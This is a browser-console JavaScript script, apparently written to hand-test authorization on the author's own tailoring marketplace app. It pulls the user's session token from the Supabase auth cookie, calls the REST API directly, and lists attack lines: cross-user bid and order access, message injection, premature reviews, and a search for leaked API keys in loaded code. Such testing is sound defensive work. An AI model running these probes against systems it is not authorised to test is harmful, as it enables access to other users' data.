// MyTailor — tampering by hand.
// 1. Log in to the site as the user you want to "attack" as.
// 2. Open DevTools → Console, paste this whole file, press Enter.
// 3. Run the attack lines printed at the end. Every call goes straight to the
//    Supabase REST API with the page's public key and YOUR login token,
//    exactly as the app does — the app is not involved.

(() => {
  // --- your session token, read from the auth cookie the app uses ---
  const parts = document.cookie
    .split("; ")
    .filter((c) => /^sb-.*-auth-token(\.\d+)?=/.test(c))
    .sort()
    .map((c) => c.slice(c.indexOf("=") + 1))
    .join("");
  let session;
  try {
    const b64 = decodeURIComponent(parts).replace(/^base64-/, "").replace(/-/g, "+").replace(/_/g, "/");
    session = JSON.parse(atob(b64));
  } catch {
    console.error("Could not read the session cookie. Are you logged in?");
    return;
  }
  const token = session.access_token;
  const url = "https://zthrdbbunspivagzwdjd.supabase.co";
  const key = "sb_publishable_BhRJGzk8GXQM9tvyPaOEVw_vEeWiGRz"; // public by design

  // --- one helper: GET or POST anything on /rest/v1 as the logged-in user ---
  window.api = async (path, body) => {
    const res = await fetch(`${url}/rest/v1/${path}`, {
      method: body ? "POST" : "GET",
      headers: { apikey: key, Authorization: `Bearer ${token}`, "Content-Type": "application/json", Prefer: "return=representation" },
      body: body ? JSON.stringify(body) : undefined,
    });
    const text = await res.text();
    let parsed;
    try { parsed = JSON.parse(text); } catch { parsed = text; }
    console.log(`%cHTTP ${res.status}`, res.status < 300 ? "color:green;font-weight:bold" : "color:red;font-weight:bold", parsed);
    return parsed;
  };
  window.me = session.user;

  console.log(`%cLogged in as ${session.user.email} (${session.user.id})`, "font-weight:bold");
  console.log(`
Attack 1 — as a TAILOR on a request you bid on (bid id is in the page: document.querySelector('[name=bid_id]')?.value)
  api('rpc/accept_bid', { p_bid_id: '<your bid id>', p_expected_price: 300, p_expected_turnaround: 14 })

Attack 2 — as a TAILOR, list every bid on a request other tailors also bid on (request id from the URL)
  api('bids?request_id=eq.<request id>&select=*')
  api('rpc/request_bid_stats', { p_request_id: '<request id>' })

Attack 3 — as the LOSING tailor or a stranger, with an order id you are not part of
  api('orders?id=eq.<order id>&select=*')
  api('messages?order_id=eq.<order id>&select=*')
  api('messages', { order_id: '<order id>', body: 'let me in' })

Attack 4 — as the CUSTOMER on an order that is not completed (or anyone else's order)
  api('reviews', { order_id: '<order id>', tailor_id: '<tailor id>', rating: 5, comment: 'too early' })

Attack 5 — View Source / Sources tab: search the loaded JS for "sk-or-" or "OPENROUTER".
`);
})();
